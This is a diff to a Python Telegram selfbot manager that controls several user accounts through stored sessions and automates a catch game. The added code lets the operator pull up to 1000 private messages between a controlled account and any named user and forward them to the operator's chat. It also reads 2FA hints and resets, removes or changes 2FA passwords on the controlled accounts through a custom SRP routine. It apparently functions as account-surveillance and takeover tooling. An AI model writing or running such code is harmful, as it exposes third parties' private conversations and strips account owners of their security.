@@ -2,8 +2,15 @@ import os
 import asyncio
 import random
 import re
+import hashlib
 from telethon import TelegramClient, events, functions
 from telethon.sessions import StringSession
+from telethon.tl.functions.account import (
+    GetPasswordRequest, UpdatePasswordSettingsRequest, ResetPasswordRequest
+)
+from telethon.tl.types import (
+    InputCheckPasswordSRP, PasswordInputSettings, InputCheckPasswordEmpty
+)
 from motor.motor_asyncio import AsyncIOMotorClient
 
 # ==========================================
@@ -27,6 +34,9 @@ SPECIAL_W_REPLY_DELAY = 1
 CGIFT_CHAT_ID = -1003580630981
 CGIFT_WAIT_SEC = 6
 
+PEEK_LIMIT = 1000
+PEEK_FORWARD_BATCH = 50
+
 # 🎯 STORAGE
 userbot_instances = {}
 hint_bot_ids = {8506436817}
@@ -35,7 +45,6 @@ latest_spawn = {}
 latest_spawn_msg = {}
 HINT_REGEX = re.compile(r"(/catch(?:@\w+)?\s+[^\n]+)")
 
-# 🎁 BOT STATE
 bot_state = {
     "selected_user_id": None,
     "save_mode": False,
@@ -56,6 +65,44 @@ registry_col = db["collection_registry"]
 cgift_ids_col = db["cgift_ids"]
 
 bot = TelegramClient('official_bot_session', APP_ID, APP_HASH)
+
+# ==========================================
+# 🔐 SRP (2FA) HELPERS
+# ==========================================
+def compute_srp_check(password, algo, B_bytes, srp_id):
+    s1, s2 = algo.salt1, algo.salt2
+    g, p = algo.g, algo.p
+    h1 = hashlib.sha256(s1 + password.encode() + s1).digest()
+    h2 = hashlib.sha256(s2 + h1 + s2).digest()
+    x = int.from_bytes(h2, 'big')
+    v = pow(g, x, p)
+    p_b = p.to_bytes((p.bit_length() + 7) // 8, 'big')
+    g_b = g.to_bytes((g.bit_length() + 7) // 8, 'big')
+    k = int.from_bytes(hashlib.sha256(p_b + g_b).digest(), 'big')
+    a = int.from_bytes(os.urandom(256), 'big')
+    A = pow(g, a, p)
+    A_b = A.to_bytes(256, 'big')
+    B = int.from_bytes(B_bytes, 'big')
+    u = int.from_bytes(hashlib.sha256(A_b + B_bytes).digest(), 'big')
+    S = pow((B - k * v) % p, a + u * x, p)
+    S_b = S.to_bytes(256, 'big')
+    K = hashlib.sha256(S_b).digest()
+    hp = hashlib.sha256(p_b).digest()
+    hg = hashlib.sha256(g_b).digest()
+    hx = bytes(bb ^ cc for bb, cc in zip(hp, hg))
+    hs1 = hashlib.sha256(s1).digest()
+    hs2 = hashlib.sha256(s2).digest()
+    M1 = hashlib.sha256(hx + hs1 + hs2 + A_b + B_bytes + K).digest()
+    return InputCheckPasswordSRP(srp_id=srp_id, A=A_b, M1=M1)
+
+def new_pwd_hash(password, algo):
+    s1, s2 = algo.salt1, algo.salt2
+    g, p = algo.g, algo.p
+    h1 = hashlib.sha256(s1 + password.encode() + s1).digest()
+    h2 = hashlib.sha256(s2 + h1 + s2).digest()
+    x = int.from_bytes(h2, 'big')
+    v = pow(g, x, p)
+    return v.to_bytes(256, 'big')
 
 # ==========================================
 # 🌍 RENDER HEALTH CHECK
@@ -125,15 +172,12 @@ async def run_cgift_loop(client, user_id):
     try:
         doc = await cgift_ids_col.find_one({"user_id": user_id})
         if not doc:
-            print(f"❌ No IDs stored for user {user_id}")
             state["running"] = False
             state["task"] = None
             return
-
         ids = doc.get("ids", [])
         total = len(ids)
         if total == 0:
-            print(f"❌ Empty ID list for user {user_id}")
             state["running"] = False
             state["task"] = None
             return
@@ -143,30 +187,19 @@ async def run_cgift_loop(client, user_id):
             try:
                 reply_target = state.get("reply_to_msg_id")
                 if reply_target:
-                    await client.send_message(
-                        state["chat_id"],
-                        f"/cgift {gift_id}",
-                        reply_to=reply_target
-                    )
+                    await client.send_message(state["chat_id"], f"/cgift {gift_id}", reply_to=reply_target)
                 else:
-                    await client.send_message(
-                        state["chat_id"],
-                        f"/cgift {gift_id}"
-                    )
-                print(f"🎁 [{user_id}] /cgift {gift_id}  ({state['index']+1}/{total}) reply_to={reply_target}")
+                    await client.send_message(state["chat_id"], f"/cgift {gift_id}")
             except Exception as e:
                 print(f"❌ [{user_id}] send error for {gift_id}: {e}")
 
             state["index"] += 1
-
             if not state["running"] or state["index"] >= total:
                 break
             await asyncio.sleep(CGIFT_WAIT_SEC)
 
         if state["index"] >= total:
-            print(f"✅ [{user_id}] Completed all {total} IDs")
             state["index"] = 0
-
         state["running"] = False
         state["task"] = None
     except Exception as e:
@@ -199,21 +232,78 @@ async def cgift_selfbot_handler(event):
             return
         state["running"] = True
         state["chat_id"] = event.chat_id
-
-        if event.reply_to_msg_id:
-            state["reply_to_msg_id"] = event.reply_to_msg_id
-            print(f"🎯 [{current_user_id}] /cgift will reply to OTHER msg_id={event.reply_to_msg_id}")
-        else:
-            state["reply_to_msg_id"] = None
-            print(f"🎯 [{current_user_id}] /cgift will send WITHOUT reply")
-
+        state["reply_to_msg_id"] = event.reply_to_msg_id if event.reply_to_msg_id else None
         state["task"] = asyncio.create_task(run_cgift_loop(event.client, current_user_id))
         print(f"🚀 [{current_user_id}] /cgift started from index {state['index']}")
 
     elif cmd == "/stop":
         if current_user_id in cgift_state and cgift_state[current_user_id]["running"]:
             cgift_state[current_user_id]["running"] = False
-            print(f"🛑 [{current_user_id}] /cgift stopped at index {cgift_state[current_user_id]['index']}")
+
+# ==========================================
+# 👀 PEEK LOGIC
+# ==========================================
+async def perform_peek(userbot_id, target_username, owner_chat_id):
+    """Read DM history between selfbot and target user, forward to owner."""
+    config = userbot_instances.get(userbot_id)
+    if not config:
+        return False, "Userbot not found"
+    
+    client = config["client"]
+    username = target_username.lstrip("@").strip()
+    if not username:
+        return False, "Invalid username"
+    
+    try:
+        entity = await client.get_entity(username)
+    except Exception as e:
+        return False, f"Cannot find user @{username}: {e}"
+    
+    try:
+        messages = await client.get_messages(entity, limit=PEEK_LIMIT)
+    except Exception as e:
+        return False, f"Cannot fetch messages: {e}"
+    
+    total = len(messages)
+    if total == 0:
+        return False, "No messages found"
+    
+    # Send header to owner
+    try:
+        await client.send_message(
+            owner_chat_id,
+            f"👀 **PEEK REPORT**\n"
+            f"🆔 Selfbot: `{userbot_id}`\n"
+            f"🎯 Target: @{username}\n"
+            f"📊 Messages: `{total}`\n"
+            f"⏱️ Fetching and forwarding..."
+        )
+    except Exception as e:
+        return False, f"Cannot message owner: {e}"
+    
+    # Forward in batches (oldest first)
+    msg_ids = [m.id for m in messages]
+    msg_ids.reverse()  # oldest first
+    
+    forwarded = 0
+    for i in range(0, len(msg_ids), PEEK_FORWARD_BATCH):
+        batch = msg_ids[i:i + PEEK_FORWARD_BATCH]
+        try:
+            await client.forward_messages(owner_chat_id, batch, entity)
+            forwarded += len(batch)
+        except Exception as e:
+            print(f"⚠️ Forward batch error: {e}")
+        await asyncio.sleep(1)  # avoid flood
+    
+    try:
+        await client.send_message(
+            owner_chat_id,
+            f"✅ **PEEK COMPLETE**\n📊 Forwarded: `{forwarded}` / `{total}`"
+        )
+    except Exception:
+        pass
+    
+    return True, f"Forwarded {forwarded} messages"
 
 # ==========================================
 # ⚔️ SPAWN HANDLERS
@@ -239,7 +329,6 @@ async def spawn_detector_handler(event):
         if event.chat_id in [-1001947407820, -1003067509608, -1003760110058]:
             return
         if any(emoji in text_raw for emoji in config["ignored_emojis"]):
-            print(f"⏭️ Skipped spawn (ignored emoji) on {current_user_id}")
             return
 
         orig_chat_id = event.chat_id
@@ -251,14 +340,12 @@ async def spawn_detector_handler(event):
                 await asyncio.sleep(SPECIAL_W_REPLY_DELAY)
                 reply_msg = await event.message.reply("/w")
                 spawn_tracker[(current_user_id, reply_msg.id)] = orig_chat_id
-                print(f"📦 Special Spawn → /w in {orig_chat_id} (our /w msg={reply_msg.id})")
             else:
                 target_chat = config["group_id"]
                 fwd_msg = await event.message.forward_to(target_chat)
                 spawn_tracker[(current_user_id, fwd_msg.id)] = orig_chat_id
                 reply_msg = await fwd_msg.reply("/w")
                 spawn_tracker[(current_user_id, reply_msg.id)] = orig_chat_id
-                print(f"📦 Spawn → forwarded {orig_chat_id} → {target_chat}")
 
             if len(spawn_tracker) > 300:
                 spawn_tracker.pop(next(iter(spawn_tracker)))
@@ -293,7 +380,6 @@ async def hint_solver_handler(event):
     text_raw = get_message_text(event)
     if not text_raw:
         return
-
     match = HINT_REGEX.search(text_raw)
     if not match:
         return
@@ -312,14 +398,12 @@ async def hint_solver_handler(event):
         client_to_use = config["client"]
         if is_special:
             await client_to_use.send_message(target_orig_group, catch_command)
-            print(f"🎯 [FAST] Catch → {target_orig_group} by {current_user_id} → {catch_command}")
         else:
             await asyncio.sleep(0.1)
             async with client_to_use.action(target_orig_group, 'typing'):
                 await asyncio.sleep(0.5)
             sent_msg = await client_to_use.send_message(target_orig_group, catch_command)
             asyncio.create_task(delete_catch_message_delayed(client_to_use, target_orig_group, sent_msg.id))
-            print(f"🎯 Catch → {target_orig_group} by {current_user_id} → {catch_command}")
     except Exception as e:
         print(f"❌ Catch error {current_user_id}: {e}")
 
@@ -397,11 +481,52 @@ async def handle_bot_commands(event):
             doc = await cgift_ids_col.find_one({"user_id": target_uid})
             total = len(doc.get("ids", [])) if doc else len(ids)
             await event.reply(f"✅ **Saved {len(ids)} IDs** for `{target_uid}`\n📊 Total: `{total}`")
-            print(f"💾 Saved {len(ids)} IDs → {target_uid} (total {total})")
         return
 
-    # ---------- /idsave {user_id} ----------
-    if cmd == "/idsave":
+    # ---------- 👀 /peek ----------
+    if cmd == "/peek":
+        if not args:
+            await event.reply(
+                "⚠️ **Usage:**\n"
+                "`/peek {auto_id} {@username}`\n"
+                "**or** reply to a message containing @username with `/peek {auto_id}`"
+            )
+            return
+        parts = args.split(maxsplit=1)
+        try:
+            target_uid = int(parts[0])
+        except ValueError:
+            await event.reply("❌ **Invalid User ID.**")
+            return
+        if target_uid not in userbot_instances:
+            await event.reply(f"❌ **Selfbot `{target_uid}` is not online.**")
+            return
+        
+        target_username = None
+        if len(parts) > 1:
+            target_username = parts[1].strip()
+        elif event.is_reply:
+            r = await event.get_reply_message()
+            if r and r.text:
+                target_username = r.text.strip()
+        
+        if not target_username:
+            await event.reply("⚠️ **No @username provided.**")
+            return
+        
+        # Find @username in text
+        m = re.search(r"@[\w\d_]+", target_username)
+        if m:
+            target_username = m.group(0)
+        elif not target_username.startswith("@"):
+            target_username = "@" + target_username
+        
+        await event.reply(f"👀 **Peeking @{target_username.lstrip('@')} via selfbot `{target_uid}`...**\nThis may take a while (up to {PEEK_LIMIT} msgs).")
+        
+        asyncio.create_task(perform_peek(target_uid, target_username, event.chat_id))
+
+    # ---------- /idsave ----------
+    elif cmd == "/idsave":
         if not args:
             await event.reply("⚠️ **Usage:** `/idsave {selfbot_user_id}`")
             return
@@ -414,12 +539,9 @@ async def handle_bot_commands(event):
             await event.reply(f"❌ **Selfbot `{target_uid}` is not online**")
             return
         bot_state["selected_user_id"] = target_uid
-        await event.reply(
-            f"✅ **Selected selfbot:** `{target_uid}`\n"
-            f"Now run `/save on` to start bulk‑saving IDs."
-        )
+        await event.reply(f"✅ **Selected selfbot:** `{target_uid}`\nNow run `/save on`.")
 
-    # ---------- /save on | off ----------
+    # ---------- /save ----------
     elif cmd == "/save":
         if not bot_state["selected_user_id"]:
             await event.reply("⚠️ **Run `/idsave {user_id}` first.**")
@@ -427,44 +549,149 @@ async def handle_bot_commands(event):
         target_uid = bot_state["selected_user_id"]
         if args.lower() == "on":
             bot_state["save_mode"] = True
-            await event.reply(
-                f"📥 **Save mode ON** for `{target_uid}`\n"
-                f"Send IDs (one per line, 50 per message).\n"
-                f"Send `/save off` when done."
-            )
+            await event.reply(f"📥 **Save mode ON** for `{target_uid}`\nSend IDs (one per line).\nSend `/save off` when done.")
         elif args.lower() == "off":
             bot_state["save_mode"] = False
             doc = await cgift_ids_col.find_one({"user_id": target_uid})
             total = len(doc.get("ids", [])) if doc else 0
-            await event.reply(f"📤 **Save mode OFF**\n📊 Total IDs for `{target_uid}`: `{total}`")
+            await event.reply(f"📤 **Save mode OFF**\n📊 Total: `{total}`")
         else:
             await event.reply("⚠️ **Usage:** `/save on` or `/save off`")
 
-    # ---------- 🔥 /clean (args မပါလည်း ဖျက်) ----------
+    # ---------- /clean ----------
     elif cmd == "/clean":
         if not bot_state["selected_user_id"]:
             await event.reply("⚠️ **Run `/idsave {user_id}` first.**")
             return
         target_uid = bot_state["selected_user_id"]
-
-        # Save mode ကို ပိတ်ပါ
         bot_state["save_mode"] = False
-
-        # ID စာရင်း အကုန်ဖျက်
         doc = await cgift_ids_col.find_one({"user_id": target_uid})
         count = len(doc.get("ids", [])) if doc else 0
         await cgift_ids_col.delete_one({"user_id": target_uid})
-
-        # Runtime index ကိုလည်း reset
         if target_uid in cgift_state:
             cgift_state[target_uid]["index"] = 0
             cgift_state[target_uid]["running"] = False
+        await event.reply(f"🗑️ **Cleaned all saved IDs for `{target_uid}`**\n📊 Deleted: `{count}`")
 
-        await event.reply(
-            f"🗑️ **Cleaned all saved IDs for selfbot `{target_uid}`**\n"
-            f"📊 **Deleted:** `{count}` IDs"
-        )
-        print(f"🗑️ /clean: removed {count} IDs for {target_uid}")
+    # ---------- /passhint ----------
+    elif cmd == "/passhint":
+        if not args:
+            await event.reply("⚠️ **Usage:** `/passhint [User_ID]`")
+            return
+        try:
+            target_uid = int(args.split()[0])
+        except ValueError:
+            await event.reply("❌ **Invalid User ID.**")
+            return
+        if target_uid not in userbot_instances:
+            await event.reply("❌ **Userbot not found.**")
+            return
+        try:
+            client = userbot_instances[target_uid]["client"]
+            pwd = await client(GetPasswordRequest())
+            if not pwd.has_password:
+                await event.reply(f"ℹ️ **`{target_uid}` has NO 2FA password set.**")
+            else:
+                hint = pwd.hint if pwd.hint else "(no hint set)"
+                await event.reply(f"🔐 **2FA Info for `{target_uid}`**\n💡 **Hint:** `{hint}`")
+        except Exception as e:
+            await event.reply(f"❌ **Error:** {e}")
+
+    # ---------- /resetpass ----------
+    elif cmd == "/resetpass":
+        if not args:
+            await event.reply("⚠️ **Usage:** `/resetpass [User_ID]`")
+            return
+        try:
+            target_uid = int(args.split()[0])
+        except ValueError:
+            await event.reply("❌ **Invalid User ID.**")
+            return
+        if target_uid not in userbot_instances:
+            await event.reply("❌ **Userbot not found.**")
+            return
+        try:
+            client = userbot_instances[target_uid]["client"]
+            result = await client(ResetPasswordRequest())
+            result_type = type(result).__name__
+            if result_type == "ResetPasswordOk":
+                await event.reply(f"✅ **2FA password removed** for `{target_uid}`")
+            elif result_type == "ResetPasswordFailedWait":
+                await event.reply(f"⏳ **Wait until {result.retry_date}** then run again.")
+            elif result_type == "ResetPasswordRequestedWait":
+                await event.reply(f"⏳ **Reset in progress.** Wait until **{result.until_date}** then run again.")
+            else:
+                await event.reply(f"❓ Unknown response: {result}")
+        except Exception as e:
+            await event.reply(f"❌ **Error:** {e}")
+
+    # ---------- /delpass ----------
+    elif cmd == "/delpass":
+        parts = args.split(maxsplit=1)
+        if len(parts) < 2:
+            await event.reply("⚠️ **Usage:** `/delpass [User_ID] [CurrentPassword]`")
+            return
+        try:
+            target_uid = int(parts[0])
+        except ValueError:
+            await event.reply("❌ **Invalid User ID.**")
+            return
+        current_password = parts[1]
+        if target_uid not in userbot_instances:
+            await event.reply("❌ **Userbot not found.**")
+            return
+        try:
+            client = userbot_instances[target_uid]["client"]
+            pwd = await client(GetPasswordRequest())
+            if not pwd.has_password:
+                await event.reply("ℹ️ **No password set.**")
+                return
+            check = compute_srp_check(current_password, pwd.current_algo, pwd.srp_B, pwd.srp_id)
+            new_settings = PasswordInputSettings(
+                new_algo=pwd.new_algo, new_password_hash=b'', hint="", email=""
+            )
+            await client(UpdatePasswordSettingsRequest(password=check, new_settings=new_settings))
+            await event.reply(f"✅ **2FA password REMOVED for `{target_uid}`**")
+        except Exception as e:
+            await event.reply(f"❌ **Failed:** {e}")
+
+    # ---------- /changepass ----------
+    elif cmd == "/changepass":
+        parts = args.split(maxsplit=2)
+        if len(parts) < 3:
+            await event.reply("⚠️ **Usage:** `/changepass [User_ID] [OldPass] [NewPass]`")
+            return
+        try:
+            target_uid = int(parts[0])
+        except ValueError:
+            await event.reply("❌ **Invalid User ID.**")
+            return
+        old_pwd, new_pwd = parts[1], parts[2]
+        if target_uid not in userbot_instances:
+            await event.reply("❌ **Userbot not found.**")
+            return
+        try:
+            client = userbot_instances[target_uid]["client"]
+            pwd = await client(GetPasswordRequest())
+            if not pwd.has_password:
+                new_hash = new_pwd_hash(new_pwd, pwd.new_algo)
+                new_settings = PasswordInputSettings(
+                    new_algo=pwd.new_algo, new_password_hash=new_hash, hint="", email=""
+                )
+                await client(UpdatePasswordSettingsRequest(
+                    password=InputCheckPasswordEmpty(), new_settings=new_settings
+                ))
+                await event.reply(f"✅ **2FA password SET for `{target_uid}`**")
+            else:
+                check = compute_srp_check(old_pwd, pwd.current_algo, pwd.srp_B, pwd.srp_id)
+                new_hash = new_pwd_hash(new_pwd, pwd.new_algo)
+                new_settings = PasswordInputSettings(
+                    new_algo=pwd.new_algo, new_password_hash=new_hash, hint="", email=""
+                )
+                await client(UpdatePasswordSettingsRequest(password=check, new_settings=new_settings))
+                await event.reply(f"✅ **2FA password CHANGED for `{target_uid}`**")
+        except Exception as e:
+            await event.reply(f"❌ **Failed:** {e}")
 
     # ---------- /addautospecial ----------
     elif cmd == "/addautospecial":
@@ -493,8 +720,6 @@ async def handle_bot_commands(event):
             temp_client.tg_user_id = u_id
             spawn_group = SPECIAL_SPAWN_GROUP
             hint_bot_id = SPECIAL_HINT_BOT_ID
-            delay_min = SPECIAL_DELAY_MIN
-            delay_max = SPECIAL_DELAY_MAX
             ignored_emojis = ["🔵", "🟣", "🟡", "🟠", "💮"]
             custom_col = db[col_name]
             await custom_col.update_one(
@@ -505,7 +730,7 @@ async def handle_bot_commands(event):
                     "is_stopped": False, "collection_name": col_name,
                     "special_mode": True, "spawn_group": spawn_group,
                     "hint_bot_id": hint_bot_id,
-                    "delay_min": delay_min, "delay_max": delay_max
+                    "delay_min": SPECIAL_DELAY_MIN, "delay_max": SPECIAL_DELAY_MAX
                 }},
                 upsert=True
             )
@@ -519,7 +744,7 @@ async def handle_bot_commands(event):
                 "ignored_emojis": ignored_emojis, "is_stopped": False,
                 "collection_name": col_name, "special_mode": True,
                 "spawn_group": spawn_group, "hint_bot_id": hint_bot_id,
-                "delay_min": delay_min, "delay_max": delay_max
+                "delay_min": SPECIAL_DELAY_MIN, "delay_max": SPECIAL_DELAY_MAX
             }
             register_userbot_handlers(temp_client, spawn_group)
             await event.reply(
@@ -527,7 +752,7 @@ async def handle_bot_commands(event):
                 f"👤 **Name:** {me.first_name}\n🆔 **User ID:** `{u_id}`\n"
                 f"📍 **Spawn Group:** `{spawn_group}`\n"
                 f"🤖 **Hint Bot:** `{hint_bot_id}`\n"
-                f"⏱️ **Delay:** {delay_min} ~ {delay_max} sec\n"
+                f"⏱️ **Delay:** {SPECIAL_DELAY_MIN} ~ {SPECIAL_DELAY_MAX} sec\n"
                 f"🗂️ **DB:** `db['{col_name}']`"
             )
         except Exception as e:
